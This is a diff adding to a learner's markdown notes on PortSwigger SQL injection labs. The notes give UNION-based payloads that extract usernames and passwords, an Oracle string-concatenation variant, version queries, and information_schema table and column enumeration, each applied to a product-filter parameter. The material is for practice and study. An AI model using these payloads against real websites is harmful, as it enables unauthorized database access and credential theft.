@@ -47,5 +47,78 @@ In this lab we send the SQL query when looking for accesories
 > Database names and columns are difficult to find. Sometimes we need to guess however, all moderns Databases have a function to examine the tables and columns, if only we can access that functionality... 
 
 
-## Lab Usefull data
-In this lab we have discovered a SQL vulnerability in the filtering
+### Lab Usefull data
+In this lab we have discovered a SQL vulnerability in the filtering of the website. Now hypothetically assume there is a table called users with a username and password column.. ah now we can use a modified query to extract this data
+
+```
+UNION SELECT username,password FROM users --
+```
+
+lab solved
+
+
+> Internal Server Error : Indicators of SQL server processing command and giving response
+
+## Combining columns in SQL from the database
+
+In ORACLE we can use the double pipe to concatonate columns
+
+```
+' UNION SELECT username || '~' || password FROM users--
+```
+
+In this case we join the fields with a '~'. Concatonation may be diffrent depending on the database
+
+![lab_complte](./simplelab.png)
+
+
+## Gather the information about the DATABASE!
+Information gathering is the most important step of trying to break in!
+- What type and version of database are they running
+- What tables and columns do they contain
+
+This can be done by doing these queries:
+
+```
+Database type	    Query
+Microsoft, MySQL	SELECT @@version
+Oracle	            SELECT * FROM v$version
+PostgreSQL	        SELECT version()
+```
+
+To aqcuire the table and columns we can attempt to use information schemas. i.e.,
+
+ `SELECT * FROM information_schema.tables`
+
+ ![tables](./tables.png)
+
+and further more we can query the columns using 
+
+`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
+
+![columns](./lab_examining_db/columns.png)
+
+## [Lab SQL Injection Examining Database](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle#) 
+
+First we try this query on the known SQLi vulnerable filter 
+> Food & Drink ' UNION SELECT table_name,NULL FROM information_schema.tables --
+
+![res](./lab_examining_db/tab_tables.png)
+We get alot of tables but looking through the [html](./lab_examining_db/labTB_return1.html)
+two tables stick out sticks out from the query results
+- pg_user
+- pg_auth_members
+
+Lets check the user table with the next query
+
+> Accessories ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'pg_user' -- 
+
+And we get these columns aha!
+![column_good](./lab_examining_db/table_columns.png)
+
+Lets finally check what the column consist of by doing a union on usename and passwd
+
+Hmm the passwords are not in cleartext infact they are just ****** symbols?![dead_end](./lab_examining_db/deadend.png)
+
+Dead end!
+
